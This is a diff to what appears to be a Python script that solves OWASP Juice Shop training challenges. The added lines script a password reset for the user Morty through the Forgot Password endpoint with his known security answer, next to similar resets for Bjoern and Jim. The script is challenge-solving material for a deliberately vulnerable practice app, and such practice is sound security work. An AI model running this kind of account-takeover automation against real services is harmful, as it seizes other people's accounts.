@@ -99,6 +99,8 @@ requests.post(url+'/rest/user/reset-password',data={'email':'bender@juice-sh.op'
 requests.post(url+'/rest/user/reset-password',data={'email':'bjoern@juice-sh.op','answer':'West-2082','new':'bjoern','repeat':'bjoern'})
 # ---- Reset Jim's Password (Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.)
 requests.post(url+'/rest/user/reset-password',data={'email':'jim@juice-sh.op','answer':'Samuel','new':'jimjim','repeat':'jimjim'})
+# ---- Reset Morty's Password (Reset Morty's password via the Forgot Password mechanism with his obfuscated answer to his security question.)
+requests.post(url+'/rest/user/reset-password',data={'email':'morty@juice-sh.op','answer':'5N0wb41L','new':'mortymorty','repeat':'mortymorty'})
 
 # ==== Captcha ===
 from json import loads
